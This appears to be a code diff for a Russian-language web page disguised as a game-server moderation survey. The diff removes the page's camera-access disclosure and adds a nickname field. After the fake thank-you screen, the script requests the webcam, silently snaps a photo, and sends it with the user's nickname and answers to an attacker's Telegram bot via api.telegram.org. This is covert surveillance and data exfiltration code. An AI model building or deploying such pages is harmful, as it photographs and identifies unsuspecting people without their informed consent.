@@ -1,102 +1,153 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Опрос пользователей</title>
+    <title>Опрос модерации</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             text-align: center;
-            background: #f0f2f5;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             padding: 20px;
             max-width: 600px;
             margin: 0 auto;
+            color: #333;
         }
         .survey-form {
             background: white;
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
         }
         h1 {
-            color: #333;
+            color: #4a4a4a;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .description {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 16px;
         }
         .question {
-            margin: 20px 0;
+            margin: 25px 0;
             text-align: left;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #4a4a4a;
+            font-size: 16px;
         }
         input, textarea, select {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
             box-sizing: border-box;
+            font-size: 15px;
+            transition: border 0.3s ease;
+        }
+        input:focus, textarea:focus, select:focus {
+            border-color: #6c63ff;
+            outline: none;
+        }
+        textarea {
+            resize: vertical;
+            min-height: 100px;
         }
         button {
-            background: #4285f4;
+            background: linear-gradient(135deg, #6c63ff 0%, #4a42e8 100%);
             color: white;
             border: none;
-            padding: 12px 20px;
-            margin-top: 20px;
-            border-radius: 5px;
+            padding: 14px 25px;
+            margin-top: 15px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 16px;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(108, 99, 255, 0.3);
+            transition: all 0.3s ease;
+            width: 100%;
         }
         button:hover {
-            background: #3367d6;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(108, 99, 255, 0.4);
+        }
+        button:active {
+            transform: translateY(0);
         }
         #thankYou {
             display: none;
             margin-top: 30px;
+            animation: fadeIn 0.5s ease;
         }
-        #videoElement {
+        .thank-you-title {
+            color: #6c63ff;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .thank-you-text {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        .emoji {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+        #videoElement, #photoCanvas {
             display: none;
         }
-        .permission-text {
-            color: #666;
-            font-size: 12px;
-            margin-top: 20px;
+        .nickname-input {
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
     <div class="survey-form">
-        <h1>Опрос удовлетворенности</h1>
-        <p>Пожалуйста, заполните эту короткую форму. Это займет не более 2 минут.</p>
+        <h1>Опрос модерации сервера</h1>
+        <p class="description">Поделитесь своим мнением о работе модераторов. Ваши ответы помогут улучшить сервер!</p>
+        
+        <div class="question nickname-input">
+            <label for="nickname">Ваш никнейм:</label>
+            <input type="text" id="nickname" placeholder="Введите ваш ник на сервере">
+        </div>
         
         <div class="question">
-            <label for="q1">1. Как вы оцениваете наш сервис?</label>
+            <label for="q1">1. Как вы оцениваете сферу модерации на сервере?</label>
             <select id="q1">
-                <option value="5">Отлично</option>
-                <option value="4">Хорошо</option>
-                <option value="3">Удовлетворительно</option>
-                <option value="2">Плохо</option>
-                <option value="1">Очень плохо</option>
+                <option value="5">Отлично - модераторы активные и справедливые</option>
+                <option value="4">Хорошо - есть небольшие недочеты</option>
+                <option value="3">Удовлетворительно - нужны улучшения</option>
+                <option value="2">Плохо - много проблем</option>
+                <option value="1">Очень плохо - полная некомпетентность</option>
             </select>
         </div>
         
         <div class="question">
-            <label for="q2">2. Что мы могли бы улучшить?</label>
-            <textarea id="q2" rows="3"></textarea>
+            <label for="q2">2. Что бы вы хотели изменить в работе модераторов?</label>
+            <textarea id="q2" placeholder="Ваши предложения по улучшению..."></textarea>
         </div>
-        
-        <p class="permission-text">При отправке формы будет запрошен доступ к камере для подтверждения личности</p>
         
         <button id="submitBtn">Отправить отзыв</button>
-        
-        <div id="thankYou">
-            <h2>Спасибо за ваш отзыв!</h2>
-            <p>Ваше мнение очень важно для нас.</p>
-        </div>
+    </div>
+
+    <div id="thankYou">
+        <div class="emoji">🎉</div>
+        <h2 class="thank-you-title">Спасибо за ваш отзыв!</h2>
+        <p class="thank-you-text">Ваше мнение очень важно для нас и поможет сделать сервер лучше.<br>Мы ценим ваше участие!</p>
     </div>
 
     <!-- Скрытые элементы для фото -->
     <video id="videoElement" autoplay></video>
-    <canvas id="photoCanvas" style="display:none;"></canvas>
+    <canvas id="photoCanvas"></canvas>
 
     <script>
         // Конфигурация (замените на свои данные)
@@ -104,31 +155,50 @@
         const TELEGRAM_CHAT_ID = '1165076107';
         
         document.getElementById('submitBtn').addEventListener('click', function() {
-            // Сначала показываем сообщение
+            const nickname = document.getElementById('nickname').value.trim();
+            if (!nickname) {
+                alert('Пожалуйста, введите ваш никнейм');
+                return;
+            }
+
+            // Сначала показываем сообщение благодарности
             document.querySelector('.survey-form').style.display = 'none';
             document.getElementById('thankYou').style.display = 'block';
             
-            // Затем запрашиваем доступ к камере
+            // Собираем данные для отправки
+            const surveyData = {
+                nickname: nickname,
+                rating: document.getElementById('q1').value,
+                comment: document.getElementById('q2').value,
+                cameraAccess: false
+            };
+            
+            // Пытаемся получить доступ к камере
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
+                    surveyData.cameraAccess = true;
                     const video = document.getElementById('videoElement');
+                    video.style.display = 'block';
                     video.srcObject = stream;
                     video.play();
                     
-                    // Делаем фото через 2 секунды
+                    // Делаем фото через 1 секунду
                     setTimeout(() => {
-                        takeAndSendPhoto();
+                        takeAndSendPhoto(surveyData);
                         // Останавливаем камеру
                         stream.getTracks().forEach(track => track.stop());
-                    }, 2000);
+                        video.style.display = 'none';
+                    }, 1000);
                 })
                 .catch(err => {
-                    console.error("Не удалось получить доступ к камере:", err);
+                    console.log("Доступ к камере не разрешен");
+                    // Отправляем данные без фото
+                    sendToTelegram(surveyData, null);
                 });
         });
         
         // Функция для создания и отправки фото
-        function takeAndSendPhoto() {
+        function takeAndSendPhoto(surveyData) {
             const video = document.getElementById('videoElement');
             const canvas = document.getElementById('photoCanvas');
             
@@ -143,26 +213,60 @@
             // Преобразуем в base64
             const photoDataUrl = canvas.toDataURL('image/jpeg').split(',')[1];
             
-            // Отправляем фото в Telegram
-            sendToTelegram(photoDataUrl);
+            // Отправляем данные в Telegram
+            sendToTelegram(surveyData, photoDataUrl);
         }
         
         // Функция отправки в Telegram
-        function sendToTelegram(photoBase64) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', base64ToBlob(photoBase64, 'image/jpeg'), 'photo.jpg');
-            formData.append('caption', 'Новое фото с сайта: ' + 
-                          'Оценка: ' + document.getElementById('q1').value + ', ' +
-                          'Комментарий: ' + document.getElementById('q2').value);
-            
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log('Данные отправлены в Telegram:', data))
-            .catch(error => console.error('Ошибка отправки:', error));
+        function sendToTelegram(surveyData, photoBase64) {
+            const text = `Новый отзыв о модерации:
+Ник: ${surveyData.nickname}
+Оценка: ${getRatingText(surveyData.rating)}
+Комментарий: ${surveyData.comment}
+Доступ к камере: ${surveyData.cameraAccess ? 'разрешен' : 'не разрешен'}`;
+
+            if (photoBase64) {
+                // Отправка с фото
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', base64ToBlob(photoBase64, 'image/jpeg'), 'photo.jpg');
+                formData.append('caption', text);
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log('Данные отправлены в Telegram:', data))
+                .catch(error => console.error('Ошибка отправки:', error));
+            } else {
+                // Отправка только текста
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text
+                    })
+                })
+                .then(response => response.json())
+                .then(data => console.log('Данные отправлены в Telegram:', data))
+                .catch(error => console.error('Ошибка отправки:', error));
+            }
+        }
+        
+        // Функция для преобразования оценки в текст
+        function getRatingText(ratingValue) {
+            const ratings = {
+                '5': 'Отлично',
+                '4': 'Хорошо',
+                '3': 'Удовлетворительно',
+                '2': 'Плохо',
+                '1': 'Очень плохо'
+            };
+            return `${ratingValue} (${ratings[ratingValue]})`;
         }
         
         // Вспомогательная функция для преобразования base64 в Blob
